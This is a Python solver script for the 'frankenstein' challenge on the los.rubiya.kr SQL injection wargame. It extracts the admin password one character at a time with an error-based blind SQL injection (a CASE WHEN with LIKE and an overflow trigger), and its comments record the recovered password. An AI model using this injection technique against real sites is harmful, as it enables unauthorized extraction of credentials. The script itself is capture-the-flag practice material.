from requests import Session, request
from time import sleep, time

URL = "https://los.rubiya.kr/chall/frankenstein_b5bab23e64777e1756174ad33f14b5db.php"
cookie = {"PHPSESSID": "6flgnknob1pkk0tu6g2cp4rtp7"}

PWLength = 0  # ?
FLAG = ""
tmp = ""


def getPW():
    global FLAG, tmp
    req = Session()
    count = 0
    while True:
        for j in range(48, 128):
            payload = f"?pw=' or CASE WHEN id='admin' and pw like '{FLAG + chr(j)}%25' THEN 0xfffffffffffff*0xfffffffffffff ELSE 0 END%23"
            """
                CASE WHEN id='admin' and pw like ~~~~~%25 THEN 0xfffffffffffff*0xfffffffffffff ELSE 0 END%23
            """

            res = req.get(url=URL + payload, cookies=cookie)
            print(payload)

            if "<hr><br>error" in res.text:
                FLAG = FLAG + chr(j)
                print(f"[*] FIND !!! :: {FLAG}")
                break

        count += 1

        if count > 20:
            print("{*] Done")
            break

    print(f"[*] PW :: {FLAG}")
    """
    lower.FLAG ~~~
    [*] PW :: 0DC4EFBB -> 0dc4efbb
    """


if __name__ == "__main__":
    getPW()
    """
    ?pw=0dc4efbb
    """
